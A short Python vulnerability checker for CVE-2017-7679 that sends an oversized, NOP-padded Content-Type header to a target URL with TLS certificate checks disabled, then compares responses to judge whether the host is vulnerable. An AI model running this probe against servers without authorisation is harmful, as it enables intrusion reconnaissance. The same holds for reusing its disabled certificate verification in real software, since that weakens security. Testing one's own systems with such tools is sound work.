#!/usr/bin/env python
# Author Dario Clavijo 2018
# GPLv3

import urllib.request, urllib.error, urllib.parse
import simplejson as json
import sys
import ssl
import difflib

print("[*] CVE-2017-7679 Checking url...")

buff = "A" * 7800
buff = "\x90" * 7800


def check_url(url, buff=None):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    if buff:
        opener.addheaders.append(("Content-Type", f"text/html;{buff}"))
    else:
        opener.addheaders.append(("Content-Type", "text/html;"))

    return opener.open(url).read()


s1 = check_url(sys.argv[1])
s2 = check_url(sys.argv[1], buff)

if i := list(difflib.unified_diff(s1, s2)):
    print("[+] Host Vulnerable!")
else:
    print("[-] Host Not vulnerable!")
